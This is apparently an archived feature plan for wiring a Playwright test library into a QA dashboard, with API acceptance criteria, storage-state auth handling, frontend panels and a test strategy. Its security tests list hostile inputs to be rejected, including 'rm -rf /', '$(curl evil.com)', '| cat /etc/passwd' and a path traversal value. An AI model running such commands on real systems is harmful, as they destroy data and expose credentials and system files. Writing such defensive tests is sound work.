---
legacy_id: playwright-standard-library-integration-full-runtime-wiring
---
# playwright-standard-library-integration-full-runtime-wiring: Playwright Standard Library Integration — Full Runtime Wiring

**Status**: COMPLETE
**Phase**: ARCHIVE
**Complexity**: Level 4
**Roadmap Link**: FEAT-052
**Branch**: feature/FEAT-052-playwright-standard-library
**Created**: 2026-05-27
**Completed**: 2026-05-27
**Archive**: memory-bank/archive/archive-playwright-standard-library-integration-full-runtime-wiring.md

---

## Context

The `playwright/` folder contains 35+ production-ready test files, 22 utility files, and a complete storage-state auth system for 13 users across 4 environments, but none of it is currently wired into the vQA product. This task delivers full runtime wiring across the backend, frontend, and infrastructure layers.

**Current State (Baseline)**:
- `GET /playwright/tests` reads from `backend/playwright_tests/` (stub with only `demo.spec.ts`)
- `PlaywrightRegistry` can load a JSON index but is pointed at the wrong directory
- `PlaywrightLibrary.tsx` is a sub-component embedded in `ExecutionPanel` — not a standalone page
- `playwright_index.json` exists at `playwright/playwright_index.json` with 40 entries (pre-indexed)
- `generateStorageStates.mjs` exists at `playwright/utils/` but is never called from the backend
- No `POST /playwright/run` endpoint exists
- No storage status/generate endpoints exist
- The WebSocket pattern (`_broadcast_terminal_log`) already works (used by playwright-test-integration-and-dashboard-execution inline executor)
- `asyncio.Semaphore` pattern is established in the codebase

---

## Feature Link

- **Feature**: [FEAT-052: Playwright Standard Library Integration — Full Runtime Wiring](../roadmap.md#feat-052-playwright-standard-library-integration--full-runtime-wiring)
- **Complexity**: Level 4

---

## Specification

### Overview

Wire the production `playwright/` directory into the vQA product. Users will navigate to `/playwright` in the dashboard, see all 40 tests grouped by JIRA prefix, configure environment/user/browser, launch a test, watch real-time streaming logs, manage auth sessions for 13 users across 4 environments, and view test history.

### User Journey

**Persona**: QA Lead / Automation Engineer
**Entry point**: vQA dashboard sidebar, "Playwright" nav link
**Precondition**: User is authenticated; backend is running on port 8000

1. User clicks **"Playwright"** in the sidebar navigation → navigates to `/playwright`
2. **Test Browser panel** loads: 40 tests appear, grouped by JIRA prefix (QA-xxx, VC2-xxx), with description and step count
3. User types in the **Search** field → list filters in real-time
4. User clicks a test card (e.g., `qa-321-sorting-list-and-compact.test`) → test is selected, highlighted
5. **Configuration panel** appears: user selects Environment (prod/test/smoke/qa), User (DemoSalesExec), Browser (chromium/firefox/webkit)
6. User clicks **"Run Test"** button → `POST /playwright/run` is called with `{test_id, env, user, browser}`
7. **Terminal panel** opens showing real-time streaming log output via the existing WebSocket channel
8. On test completion, **exit code badge** appears: ✅ PASSED or ❌ FAILED (with exit code)
9. **Storage Manager tab**: user can view a 13×4 matrix of session status (valid/expired/missing) for all users × environments
10. User clicks **"Refresh Auth"** for a specific environment → `POST /playwright/storage/generate` is called
11. Success message: **"Storage states regenerated for [env]: 13/13 users"**

### Invocation Location

- **Page**: `/playwright` (new full-page route added to `frontend/src/router.tsx`)
- **Nav element**: "Playwright" item in the existing sidebar/nav component in `Dashboard.tsx`

### Invocation Element

- **Run button**: `<button id="playwright-run-btn">Run Test</button>` — enabled only when a test is selected and no run is in progress
- **Refresh Auth button**: `<button id="playwright-auth-refresh-btn">Refresh Auth</button>` — per-environment in the Storage Manager

### Success Messages

- Test run launch: **"Test started — streaming output below"** (appears in terminal header)
- Auth refresh success: **"Storage states regenerated for [env]: 13/13 users"**
- Auth refresh failure: **"Auth refresh failed for [env]: see logs below"**

### Data Persistence

- Storage state files: `playwright/storage/{env}/storageState_{User}.json` (written by `generateStorageStates.mjs`)
- Test run history: in-memory only (no DB persistence in Phase 1 — history is derived from WebSocket log)
- `playwright_index.json`: `playwright/playwright_index.json` (pre-existing, read-only from backend's perspective)

---

## Acceptance Criteria

> ACs are organized by the four FEAT-052 requirement areas. Each AC maps directly to a buildable, testable deliverable.

---

### Area 1 — Backend API & Playwright Wiring

**AC-BACK-1 — Registry re-pointed to canonical index**
- Given the backend starts with no `PLAYWRIGHT_INDEX_FILE` env var set
- When `GET /playwright/tests` is called
- Then the response contains exactly the 40 entries from `playwright/playwright_index.json`, and `backend/playwright_tests/` is never scanned.

**AC-BACK-2 — Test listing includes full metadata**
- Given the canonical `playwright_index.json` is loaded
- When `GET /playwright/tests` responds
- Then each entry includes: `id`, `file`, `jira_keys` (array), `description`, `steps_count`, `step_names` (array).

**AC-BACK-3 — Run endpoint validates test_id from allow-list**
- Given a `POST /playwright/run` request with `test_id` not present in `playwright_index.json`
- When the request is processed
- Then the response is HTTP 422 with body `{"detail": "Unknown test_id: <value>"}`.

**AC-BACK-4 — Run endpoint validates env enum**
- Given a `POST /playwright/run` request with `env` = `"staging"` (not a valid environment)
- When the request is processed
- Then the response is HTTP 422 with body describing the invalid value.

**AC-BACK-5 — Run endpoint validates browser enum**
- Given a `POST /playwright/run` request with `browser` = `"safari"` (not chromium/firefox/webkit)
- When the request is processed
- Then the response is HTTP 422 with body describing the invalid value.

**AC-BACK-6 — Command injection is blocked**
- Given a `POST /playwright/run` request where `test_id` contains shell metacharacters (e.g., `"; rm -rf /"`, `"$(curl evil.com)"`, or `"| cat /etc/passwd"`)
- When the request is processed
- Then the response is HTTP 422 and no subprocess is spawned.

**AC-BACK-7 — Successful run streams logs via WebSocket**
- Given a valid `POST /playwright/run` with an existing `test_id`, valid `env`, `user`, `browser`
- When the endpoint returns `{"run_id": "<id>", "status": "started"}`
- Then the WebSocket at `ws://{host}/ws/{run_id}` begins receiving `WSTerminalMessage` events containing Playwright stdout/stderr lines.

**AC-BACK-8 — Log scrubber masks secrets**
- Given a Playwright subprocess emits a line containing the literal value of `SHARED_TEST_PASSWORD`
- When that line is broadcast via `_broadcast_terminal_log`
- Then the broadcast message contains `[REDACTED]` in place of the password value (not the key, just the secret value).

**AC-BACK-9 — Log scrubber masks session tokens**
- Given a Playwright subprocess emits a line containing a JSON `storageState` blob or a JWT-shaped string
- When that line is broadcast
- Then the sensitive token portion is replaced with `[REDACTED]`.

**AC-BACK-10 — Concurrency semaphore limits to 2 concurrent runs**
- Given 2 Playwright test runs are already in progress
- When a 3rd `POST /playwright/run` request is made
- Then the response is HTTP 429 with body `{"detail": "Too many concurrent Playwright runs. Max: 2"}`.

**AC-BACK-11 — PID tracking enables subprocess cleanup**
- Given a test run is in progress with a tracked PID
- When the FastAPI server shuts down (lifespan shutdown event)
- Then all tracked Playwright subprocess PIDs receive SIGTERM within 5 seconds.

**AC-BACK-12 — Storage status endpoint**
- Given `GET /playwright/storage/status` is called
- When the response is returned
- Then it contains a dict keyed by environment (`prod`, `test`, `smoke`, `qa`), each containing all 13 user keys with status `"valid"`, `"expired"`, or `"missing"`.
  - `"valid"` = file exists and `mtime` is within 24 hours
  - `"expired"` = file exists but `mtime` >= 24 hours ago
  - `"missing"` = `storageState_{User}.json` does not exist in `playwright/storage/{env}/`

**AC-BACK-13 — Storage generate endpoint triggers generateStorageStates.mjs**
- Given `POST /playwright/storage/generate` with body `{"env": "test"}`
- When the subprocess completes successfully (exit code 0)
- Then the response is `{"status": "ok", "generated": 13}` (13 = number of users processed).

**AC-BACK-14 — Storage generate throttle: only one concurrent generate**
- Given a `POST /playwright/storage/generate` is already in progress
- When a second request arrives before the first completes
- Then the second request is queued or returns HTTP 429 with `{"detail": "Storage generation already in progress"}`.

**AC-BACK-15 — Storage generate handles mjs failure**
- Given `generateStorageStates.mjs` exits non-zero (e.g., `SHARED_TEST_PASSWORD` is unset)
- When `POST /playwright/storage/generate` is called
- Then the response is HTTP 500 with `{"detail": "Storage generation failed", "stderr": "<error output>"}`.

---

### Area 2 — Fixtures, Users & Storage State Management

**AC-STOR-1 — users.json populated with all 13 users**
- Given `playwright/fixtures/users/users.json` exists
- When parsed
- Then it contains exactly 13 entries, each with: `email`, `username` (the storage-state filename key), `role`, `is_admin` (bool).
- The 13 users must include: `Admin`, `DemoProdDirector`, `DemoTrafficDirector`, `DemoSalesExec`, `DemoProdMan`, `DemoProdWoman`, `DemoDigitalDir`, `DemoDigitalProd`, `DemoVoicer`, `DemoGM`, `DemoGraphicArtist`, `writer`, `DemoTrafficAssnt`.

**AC-STOR-2 — Storage directories exist**
- Given `playwright/storage/` exists
- When listing subdirectories
- Then `prod/`, `test/`, `smoke/`, and `qa/` all exist (created on first generate if missing).

**AC-STOR-3 — Storage state filenames follow convention**
- Given `POST /playwright/storage/generate` runs successfully for `env=test`
- When `playwright/storage/test/` is listed
- Then it contains files named `storageState_Admin.json`, `storageState_DemoProdDirector.json`, etc. — matching the username field in `users.json`.

**AC-STOR-4 — .env.example documents all required vars**
- Given `.env.example` is opened
- When searching for Playwright-related vars
- Then the following are present with descriptions:
  - `PLAYWRIGHT_TESTS_DIR=playwright/tests`
  - `PLAYWRIGHT_INDEX_FILE=playwright/playwright_index.json`
  - `SHARED_TEST_PASSWORD=<your-shared-password>`
  - `ADMIN_TEST_PASSWORD=<your-admin-password>`
  - `TEST_ENV=test`

---

### Area 3 — Frontend Playwright Dashboard

**AC-FE-1 — Route exists and is protected**
- Given the user is not authenticated
- When navigating to `/playwright`
- Then the user is redirected to `/login`.

**AC-FE-2 — Route exists and renders for authenticated users**
- Given the user is authenticated
- When navigating to `/playwright`
- Then the page renders with the title "Playwright Test Library" and no console errors.

**AC-FE-3 — Sidebar nav item present**
- Given the user is on any authenticated page
- When the sidebar is visible
- Then a "Playwright" nav item is present and clicking it navigates to `/playwright`.

**AC-FE-4 — Test browser panel displays all 40 tests**
- Given the `/playwright` page has loaded and `GET /playwright/tests` succeeds
- When the Test Browser panel is rendered
- Then all 40 tests from `playwright_index.json` are displayed, each showing: test name/ID, JIRA keys, step count.

**AC-FE-5 — Tests grouped by JIRA prefix**
- Given the Test Browser panel is rendered
- When viewing the list
- Then tests are grouped under section headers: `QA`, `VC2`, `Other` (for tests with no JIRA key).

**AC-FE-6 — Search filters by name, description, and JIRA key**
- Given the Test Browser panel is rendered
- When the user types `"321"` in the search field
- Then only the test `qa-321-sorting-list-and-compact.test` is shown.

**AC-FE-7 — Selecting a test highlights it and enables the Run button**
- Given the Test Browser is rendered
- When the user clicks a test card
- Then the card gets a `selected` visual state and the "Run Test" button becomes enabled.

**AC-FE-8 — Configuration panel has env/user/browser selectors**
- Given a test is selected
- When the Configuration panel is visible
- Then it includes:
  - Environment dropdown with options: `prod`, `test`, `smoke`, `qa` (default: `test`)
  - User dropdown with all 13 user names (default: `DemoSalesExec`)
  - Browser dropdown with options: `chromium`, `firefox`, `webkit` (default: `chromium`)

**AC-FE-9 — Clicking "Run Test" starts the run and shows streaming terminal**
- Given a test is selected and configuration is set
- When the user clicks "Run Test"
- Then:
  1. The button changes to a disabled "Running..." state
  2. The terminal panel appears with the message "Test started — streaming output below"
  3. Log lines begin appearing in real-time as the subprocess runs

**AC-FE-10 — Terminal panel is windowed (last 500 lines)**
- Given a Playwright test that emits >500 log lines is running
- When lines arrive
- Then only the last 500 lines are kept in the terminal's state (older lines are dropped).
- The user can scroll to view the most recent output.

**AC-FE-11 — Test completion shows PASSED/FAILED badge**
- Given a Playwright test run has completed
- When the final exit code is received via WebSocket
- Then:
  - Exit code 0 → green `✅ PASSED` badge in the terminal header
  - Non-zero exit code → red `❌ FAILED (exit code N)` badge

**AC-FE-12 — Storage Manager tab shows 13×4 matrix**
- Given the user switches to the "Storage Manager" tab on `/playwright`
- When `GET /playwright/storage/status` resolves
- Then a table/grid displays 13 rows (users) × 4 columns (environments) with color-coded badges:
  - Green = `valid` (session is fresh)
  - Amber = `expired` (session is stale, >24h)
  - Red = `missing` (no storage state file)

**AC-FE-13 — Refresh Auth button triggers generation and shows feedback**
- Given the Storage Manager is displayed
- When the user clicks "Refresh Auth" for environment `test`
- Then:
  1. The button enters a loading state "Generating..."
  2. `POST /playwright/storage/generate` is called with `{"env": "test"}`
  3. On success: inline banner shows "Storage states regenerated for test: 13/13 users"
  4. The status matrix refreshes automatically

**AC-FE-14 — Dashboard matches dark-mode aesthetic**
- Given the `/playwright` page renders
- When visually inspected
- Then the page uses the same dark-mode color palette, typography (same font family), and component styling as the existing vQA dashboard (e.g., `Dashboard.tsx`).

---

### Area 4 — Playwright Config & Package Wiring

**AC-CFG-1 — playwright.config.ts exists at root**
- Given the repository root
- When `playwright.config.ts` is read
- Then it defines:
  - `testDir: './playwright/tests'`
  - At least one project: `chromium`
  - `use.baseURL` sourced from env var

**AC-CFG-2 — Root package.json has playwright npm scripts**
- Given `package.json` at the repository root (or frontend root)
- When `npm run playwright:run` is invoked
- Then it runs `cd playwright && npx playwright test` (or equivalent).
- Similarly: `playwright:auth` runs `node playwright/utils/generateStorageStates.mjs`; `playwright:report` runs `npx playwright show-report`.

**AC-CFG-3 — @playwright/test is available as a devDependency**
- Given `package.json` (root or playwright directory)
- When reading `devDependencies`
- Then `@playwright/test` is listed with a version compatible with the existing test files.

---

### Entry Criteria (Pre-Build Gate)

**AC-ENTRY-1** — Memory bank initialized (VC Version present in `projectConfig.md`) ✅  
**AC-ENTRY-2** — FEAT-052 exists in `roadmap.md` and is linked to playwright-standard-library-integration-full-runtime-wiring ✅  
**AC-ENTRY-3** — `playwright_index.json` exists at `playwright/playwright_index.json` with ≥35 entries ✅  
**AC-ENTRY-4** — `generateStorageStates.mjs` exists at `playwright/utils/generateStorageStates.mjs` ✅  
**AC-ENTRY-5** — Existing WebSocket broadcast infrastructure (`_broadcast_terminal_log`) is verified working (from playwright-test-integration-and-dashboard-execution) ✅

---

## Proposed Solution & Architecture

### Phase 1: Data Preparation & Indexing

The `playwright_index.json` already exists at `playwright/playwright_index.json` (40 entries, pre-indexed). This is the source of truth.

**Changes**:
- `backend/storage/playwright_registry.py`: Update `PlaywrightRegistry` to read from the canonical `playwright_index.json` instead of globbing `backend/playwright_tests/`. Default `PLAYWRIGHT_INDEX_FILE` env var → `playwright/playwright_index.json`.
- `playwright/fixtures/users/users.json`: Populate with the 13 real users from `generateStorageStates.mjs` (13 emails + username mappings).
- `.env.example`: Add `PLAYWRIGHT_INDEX_FILE`, `PLAYWRIGHT_TESTS_DIR`, `SHARED_TEST_PASSWORD`, `ADMIN_TEST_PASSWORD`, `TEST_ENV`.
- `scripts/sync_playwright_index.py`: Already described in task — create this script to re-parse `.test.ts` files and regenerate `playwright_index.json`. Used for maintenance, not at runtime.

### Phase 2: Backend API & Safety Wiring

All new endpoints in `backend/api/routes.py` (or a new `backend/api/playwright_routes.py` sub-module for organization).

#### `POST /playwright/run`
```
Request:  { "test_id": str, "env": str, "user": str, "browser": str }
Response: { "run_id": str, "status": "started" }

Validation:
  - test_id: must exist in playwright_index.json (allow-list)
  - env: must be in {"prod", "test", "smoke", "qa"}
  - user: must be in users fixture (allow-list)
  - browser: must be in {"chromium", "firefox", "webkit"}
  - No shell metacharacters: reject if test_id contains [;&|`$(){}]

Execution:
  - asyncio.Semaphore(2) concurrency gate → 429 if saturated
  - subprocess: npx playwright test playwright/tests/{test_file} 
                --headed=false 
                --project={browser}
  - Environment: copy os.environ + TEST_ENV={env} + storageState path
  - Stream stdout/stderr via _broadcast_terminal_log with LOG_SCRUBBER
  - Track PID in _playwright_pids: dict[run_id, int]

Log Scrubber (regex-based):
  - Mask SHARED_TEST_PASSWORD value
  - Mask ADMIN_TEST_PASSWORD value  
  - Mask storageState JSON content (session tokens)
  - Pattern: re.sub(r'(password|token|storageState)["\s:=]+\S+', '[REDACTED]', line, flags=re.I)
```

#### `GET /playwright/storage/status`
```
Returns: { "environments": { "prod": { "DemoSalesExec": "valid"|"expired"|"missing", ... }, ... } }
Logic: Check filesystem for playwright/storage/{env}/storageState_{user}.json
       "valid" if file exists and mtime < 24h
       "expired" if file exists and mtime >= 24h  
       "missing" if file does not exist
```

#### `POST /playwright/storage/generate`
```
Request:  { "env": str }  (optional — if omitted, generate all 4 envs)
Response: { "status": "ok", "generated": N }
Logic: Shell out to: node playwright/utils/generateStorageStates.mjs
       with TEST_ENV={env} in environment
       Throttle: allow only 1 concurrent generate at a time (asyncio.Lock)
       Timeout: 300s (auth for 13 users × 4 envs can be slow)
```

### Phase 3: Frontend Dashboard

**New page**: `frontend/src/pages/PlaywrightPage.tsx`
**Route**: `/playwright` added to `frontend/src/router.tsx`
**Navigation**: "Playwright" added to sidebar in `Dashboard.tsx`

#### Component Structure
```
PlaywrightPage.tsx
├── TestBrowserPanel.tsx      # Searchable/filterable list, grouped by JIRA prefix
├── TestConfigPanel.tsx       # env/user/browser selectors  
├── RunControlPanel.tsx       # Run button + windowed terminal output
└── StorageManagerPanel.tsx   # 13×4 status matrix + Refresh Auth per env
```

#### Design Requirements
- Dark-mode consistent with existing vQA dashboard aesthetic
- Terminal panel: fixed-height scrollable area (last 500 lines kept, older truncated to prevent browser memory bloat)
- Storage matrix: color-coded badges (green=valid, amber=expired, red=missing)
- ANSI color stripping or rendering for Playwright terminal output (Playwright uses ANSI codes for pass/fail)

### Phase 4: Verification & Infrastructure

- **NPM scripts** in root `package.json`:
  - `"playwright:run": "cd playwright && npx playwright test"`
  - `"playwright:auth": "node playwright/utils/generateStorageStates.mjs"`
  - `"playwright:report": "npx playwright show-report"`
- **`playwright.config.ts`** at root: verify/create with correct testDir and project config
- **Load test**: Confirm server remains responsive with 2 concurrent Playwright subprocesses running
- **All 40 tests discoverable**: `GET /playwright/tests` returns exactly the entries from `playwright_index.json`

---

## Risk & Performance Mitigations

| Category | Mitigation Strategy |
| :--- | :--- |
| **Security** | **Strict Input Validation**: Use an allow-list from `playwright_index.json` for `test_id`. Validate `env`, `user`, and `browser` against known enums to prevent command injection. |
| **Security** | **Log Scrubbing**: Implement a regex-based scrubber in the WebSocket stream to mask `SHARED_TEST_PASSWORD` and session tokens before they reach the UI. |
| **Stability** | **Concurrency Control**: Use a FastAPI `asyncio.Semaphore` to limit concurrent test runs (default: 2) to prevent CPU/RAM exhaustion. |
| **Stability** | **Process Management**: Track subprocess PIDs in `_playwright_pids: dict[str, int]`; implement a cleanup routine to kill orphaned processes on server shutdown or task timeout. |
| **Performance** | **Log Windowing**: Terminal component keeps last 500 lines in state; older lines dropped to prevent browser memory bloat. |
| **Performance** | **Throttled Auth**: Single `asyncio.Lock` serializes `POST /playwright/storage/generate` requests. |

---

## Guiding Principles Compliance

| Principle | Compliance |
|---|---|
| **Config in Environment** | All env-specific settings (`PLAYWRIGHT_TESTS_DIR`, `PLAYWRIGHT_INDEX_FILE`, `SHARED_TEST_PASSWORD`, `TEST_ENV`) sourced from `.env` |
| **12-Factor App** | New endpoints are stateless; PIDs tracked in module-level dict (acceptable for single-instance deployment) |
| **Subprocess Log Streaming** | Reuses existing `_broadcast_terminal_log` + `WSTerminalLogMessage` pattern (from playwright-test-integration-and-dashboard-execution / systemPatterns.md) |
| **Test Library Registry** | `PlaywrightRegistry` is the canonical abstraction — updated, not replaced |
| **Dual Execution Engine Pattern** | New `/playwright/run` endpoint follows the same subprocess streaming pattern established in playwright-test-integration-and-dashboard-execution |

**Deviation flag**: The new `POST /playwright/run` endpoint creates a standalone run outside the LangGraph state machine. This is intentional and consistent with the Dual Execution Engine pattern — static Playwright tests do not use the AI agent. The `_playwright_pids` dict follows the same in-memory pattern as `_run_states`.

---

## Implementation Roadmap

### Phase 1: Data Preparation & Indexing (Day 1)

| Sub-task | File(s) | Notes |
|---|---|---|
| Update `PlaywrightRegistry` default to read `playwright/playwright_index.json` | `backend/storage/playwright_registry.py` | Change `PLAYWRIGHT_INDEX_FILE` default |
| Update API routes default env var | `backend/api/routes.py` L1932, L1944 | Point to `playwright/playwright_index.json` |
| Populate `playwright/fixtures/users/users.json` | NEW file | 13 users from `generateStorageStates.mjs` |
| Update `.env.example` | `.env.example` | Add 5 new vars |
| Create `scripts/sync_playwright_index.py` | NEW file | Maintenance script for re-indexing |
| Write unit tests for Phase 1 | `tests/test_playwright_registry.py` | Verify JSON loading, allow-list behavior |

### Phase 2: Backend API & Safety Wiring (Day 1-2)

| Sub-task | File(s) | Notes |
|---|---|---|
| Add `POST /playwright/run` | `backend/api/routes.py` or `backend/api/playwright_routes.py` | Full validation + semaphore + PID tracking |
| Add `_log_scrubber()` function | Same file | Regex-based password/token masking |
| Add `GET /playwright/storage/status` | Same file | Filesystem check per user × env |
| Add `POST /playwright/storage/generate` | Same file | `asyncio.Lock` throttle, `node generateStorageStates.mjs` |
| Add PID cleanup on shutdown | `backend/main.py` shutdown hook | SIGTERM orphaned processes |
| Write security tests | `tests/test_playwright_run_security.py` | Shell injection attempts, invalid test_id |
| Write integration tests | `tests/test_playwright_run_integration.py` | Mock subprocess, verify log scrubbing |

### Phase 3: Frontend Dashboard (Day 2-3)

| Sub-task | File(s) | Notes |
|---|---|---|
| Create `PlaywrightPage.tsx` | `frontend/src/pages/PlaywrightPage.tsx` | NEW full page component |
| Create `TestBrowserPanel.tsx` | Sub-component | Searchable, grouped by JIRA prefix |
| Create `TestConfigPanel.tsx` | Sub-component | env/user/browser selectors |
| Create `RunControlPanel.tsx` | Sub-component | Windowed terminal (last 500 lines) |
| Create `StorageManagerPanel.tsx` | Sub-component | 13×4 matrix with color badges |
| Add `/playwright` route | `frontend/src/router.tsx` | Protected route |
| Add "Playwright" nav item | `frontend/src/components/Dashboard.tsx` | Sidebar nav link |
| Add API helper methods | `frontend/src/api_client.ts` | `runPlaywrightTest`, `getStorageStatus`, `generateStorageStates` |

### Phase 4: Verification & Infrastructure (Day 3)

| Sub-task | File(s) | Notes |
|---|---|---|
| Verify/create `playwright.config.ts` | `playwright.config.ts` (root) | testDir, projects |
| Add npm scripts | `package.json` (root) | playwright:run, playwright:auth, playwright:report |
| E2E smoke: 40 tests discoverable | Manual + pytest | `GET /playwright/tests` returns 40 entries |
| E2E smoke: storage status endpoint | Manual + pytest | `GET /playwright/storage/status` responds |
| Load test: 2 concurrent runs | Manual | curl two runs simultaneously, check server health |

---

## Testing Strategy

### Unit Tests (pytest)
- `tests/test_playwright_registry.py`: Verify `PlaywrightRegistry` loads `playwright_index.json`, returns correct metadata, `get_test()` returns None for unknown IDs
- `tests/test_playwright_log_scrubber.py`: Verify regex scrubber masks password/token strings, leaves clean lines untouched, handles edge cases (empty line, multiline)

### Security Tests (pytest)
- `tests/test_playwright_run_security.py`:
  - Attempt `test_id` = `"; rm -rf /"` → assert HTTP 422
  - Attempt `env` = `"../../etc/passwd"` → assert HTTP 422
  - Attempt `browser` = `"chromium; curl evil.com"` → assert HTTP 422
  - Verify `_log_scrubber()` masks `SHARED_TEST_PASSWORD` value
  - Verify `_log_scrubber()` masks ADMIN password value

### Integration Tests (pytest)
- `tests/test_playwright_run_integration.py`:
  - Mock `asyncio.create_subprocess_exec` → verify semaphore blocks 3rd concurrent call
  - Mock subprocess returning exit_code=1 → verify `last_error` set correctly
  - Verify `_broadcast_terminal_log` called with scrubbed lines

### E2E Verification (Manual + curl)
- `GET /playwright/tests` → assert 40 entries, all have `id`, `description`, `steps_count`
- `GET /playwright/storage/status` → assert 4 environments, 13 users each
- `POST /playwright/run` with valid test → assert WebSocket streams logs
- `POST /playwright/run` with invalid test_id → assert HTTP 422

### Verify (ruff + mypy + build)
```bash
ruff check backend/
cd frontend && npm run build
pytest tests/test_playwright_registry.py tests/test_playwright_log_scrubber.py tests/test_playwright_run_security.py -v
```

---

## Execution State

**Build Status**: IDLE
**Current Phase**: ARCHIVE — COMPLETE
**Current Step**: ARCHIVED — 2026-05-27T13:54:00-05:00
**Reflection Completed**: 2026-05-27T13:35:00-05:00
**Can Resume**: NO

### Active Sub-Agents
_(none — creative session complete)_

### Completed Steps
- User Journey Creative Design: COMPLETE (2026-05-27T12:22:00-05:00) - Output: memory-bank/creative/playwright-standard-library-integration-full-runtime-wiring-playwright-dashboard-user-journey.md
- Architecture Creative Design: COMPLETE (2026-05-27T12:22:00-05:00) - Output: memory-bank/creative/playwright-standard-library-integration-full-runtime-wiring-playwright-dashboard-architecture.md
- UI/UX Creative Design: COMPLETE (2026-05-27T12:22:00-05:00) - Output: memory-bank/creative/playwright-standard-library-integration-full-runtime-wiring-playwright-dashboard-uiux.md
- Algorithm Creative Design: COMPLETE (2026-05-27T12:22:00-05:00) - Output: memory-bank/creative/playwright-standard-library-integration-full-runtime-wiring-playwright-dashboard-algorithm.md

### Build History

| Step | Action | Result | Timestamp |
|------|--------|--------|-----------|
| PLAN | Initial planning session | PLANNING_COMPLETE | 2026-05-27 |
| PLAN | Spec deepened — full AC, implementation roadmap, test strategy | PLANNING_COMPLETE | 2026-05-27 |
| CREATIVE | Inline creative session — all 4 phases | CREATIVE_COMPLETE | 2026-05-27 |
